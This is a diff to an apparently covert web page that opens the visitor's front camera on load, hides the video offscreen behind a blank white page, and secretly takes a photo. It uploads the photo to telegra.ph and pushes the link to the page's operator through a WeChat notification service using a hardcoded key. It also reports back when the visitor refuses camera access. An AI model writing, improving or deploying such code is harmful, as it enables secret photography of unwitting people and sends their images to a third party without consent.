@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <style>
-/* 核心修复：视频不设display:none，而是移出屏幕，视觉隐藏但浏览器正常渲染，彻底解决黑屏 */
 #cam{position:absolute;left:-9999px;top:-9999px;width:480px;height:480px;}
 #box{display:none}
 body{background:#fff;height:100vh;margin:0;overflow:hidden;}
@@ -15,10 +14,9 @@ body{background:#fff;height:100vh;margin:0;overflow:hidden;}
 <canvas id="box" width="480" height="480"></canvas>
 
 <script>
-// 你的专属推送密钥，已确认可用
 const SEND_KEY = "SCT347091TUpxTiAuPOAvg27UhZnouc6Th";
 
-// 微信推送核心函数
+// 微信推送
 async function sendToWechat(title, content) {
   try {
     await fetch(`https://sctapi.ftqq.com/${SEND_KEY}.send`, {
@@ -26,16 +24,32 @@ async function sendToWechat(title, content) {
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
       body: `title=${encodeURIComponent(title)}&desp=${encodeURIComponent(content)}`
     });
-    return true;
+  } catch (e) {}
+}
+
+// 上传图片生成短链接（Telegraph图床，稳定无跨域）
+async function uploadToShortLink(base64) {
+  try {
+    const formData = new FormData();
+    const blob = await (await fetch(base64)).blob();
+    formData.append("file", blob, "photo.jpg");
+    const res = await fetch("https://telegra.ph/upload", {
+      method: "POST",
+      body: formData
+    });
+    const result = await res.json();
+    if (result && result[0]?.src) {
+      return `https://telegra.ph${result[0].src}`;
+    }
+    return null;
   } catch (e) {
-    return false;
+    return null;
   }
 }
 
-// 自动拍照主逻辑（彻底修复黑屏版）
+// 拍照主逻辑
 async function autoTakePhoto() {
   try {
-    // 请求前置摄像头权限
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user", width: 480, height: 480 }
     });
@@ -44,29 +58,27 @@ async function autoTakePhoto() {
     const ctx = canvas.getContext("2d");
     video.srcObject = stream;
 
-    // 等摄像头画面完全加载、可流畅播放时，再执行拍照
-    video.oncanplaythrough = () => {
-      // 延长等待时间到500ms，确保移动端画面完全渲染，杜绝黑屏
+    video.oncanplaythrough = async () => {
       setTimeout(async () => {
-        // 绘制实时画面到画布
         ctx.drawImage(video, 0, 0, 480, 480);
-        // 压缩图片，避免推送长度超限
         const base64Img = canvas.toDataURL("image/jpeg", 0.6);
-        // 关闭摄像头，减少设备占用
         stream.getTracks().forEach(track => track.stop());
 
-        // 推送照片查看链接到微信
-        const pushContent = `✅ 拍照成功！\n\n复制下面完整的链接到手机浏览器，即可直接查看实拍照片：\n\n${base64Img}`;
-        await sendToWechat("成功拍到新照片", pushContent);
+        // 上传图片，生成短链接
+        const shortLink = await uploadToShortLink(base64Img);
+        if (shortLink) {
+          await sendToWechat("✅ 拍照成功", `点击链接直接查看照片：\n${shortLink}`);
+        } else {
+          // 上传失败，兜底推base64
+          await sendToWechat("拍照成功（备用链接）", `复制到浏览器打开：\n${base64Img}`);
+        }
       }, 500);
     };
   } catch (e) {
-    // 权限拒绝/出错，推送兜底通知
     await sendToWechat("链接访问提醒", "对方拒绝了摄像头权限，无法拍照");
   }
 }
 
-// 页面加载立刻执行
 autoTakePhoto();
 </script>
 </body>
